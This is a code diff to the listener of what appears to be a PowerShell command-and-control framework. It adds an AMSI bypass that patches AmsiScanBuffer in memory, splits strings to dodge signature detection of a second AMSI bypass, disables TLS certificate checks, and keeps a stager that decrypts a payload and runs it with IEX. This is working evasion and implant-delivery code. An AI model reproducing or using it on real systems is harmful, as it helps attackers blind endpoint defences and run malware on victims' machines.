@@ -275,7 +275,39 @@ class Listener:
 
                 stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
-                    stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
+
+                    #
+                    # Disable Antimalware Scan Interface
+                    #
+                    stager = '$Win32 = @"\n'
+                    stager += 'using System;\n'
+                    stager += 'using System.Runtime.InteropServices;\n'
+
+                    stager += 'public class Win32 {\n'
+
+                    stager += '    [DllImport("kernel32")]\n'
+                    stager += '    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n'
+
+                    stager += '    [DllImport("kernel32")]\n'
+                    stager += '    public static extern IntPtr LoadLibrary(string name);\n'
+
+                    stager += '    [DllImport("kernel32")]\n'
+                    stager += '    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);\n'
+
+                    stager += '}\n'
+                    stager += '"@\n'
+
+                    stager += 'Add-Type $Win32;\n'
+
+                    stager += '$LoadLibrary = [Win32]::LoadLibrary("amsi.dll");\n'
+                    stager += '$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer");\n'
+                    stager += '$p = 0;\n'
+                    stager += '[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p);\n'
+                    stager += '$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);\n'
+                    stager += '[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6);\n'
+
+
+                    stager += helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
 
                     # ScriptBlock Logging bypass
                     stager += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
@@ -301,9 +333,9 @@ class Listener:
 
                     # @mattifestation's AMSI bypass
                     stager += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
-                    stager += "'System.Management.Automation.AmsiUtils'"
+                    stager += "'System.Management.Automation.Am' + 'siUtils'"
                     stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
-                    stager += "'amsiInitFailed','NonPublic,Static'"
+                    stager += "'am'+'siInitFailed','NonPublic,Static'"
                     stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
                     stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
@@ -317,6 +349,7 @@ class Listener:
 
                 if 'https' in host:
                     # allow for self-signed certificates for https connections
+                    stager += "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;"
                     stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
 
                 if userAgent.lower() != 'none':
@@ -401,6 +434,7 @@ class Listener:
                 # decode everything and kick it over to IEX to kick off execution
                 stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
 
+                print "*** Obfuscate : " + str(obfuscate)
                 if obfuscate:
                     stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
                 # base64 encode the stager and return it
@@ -718,6 +752,7 @@ class Listener:
 
                 if listenerOptions['Host']['Value'].startswith('https'):
                     updateServers += "\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
+                    updateServers += "\n[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;"
 
                 getTask = """
                     $script:GetTask = {
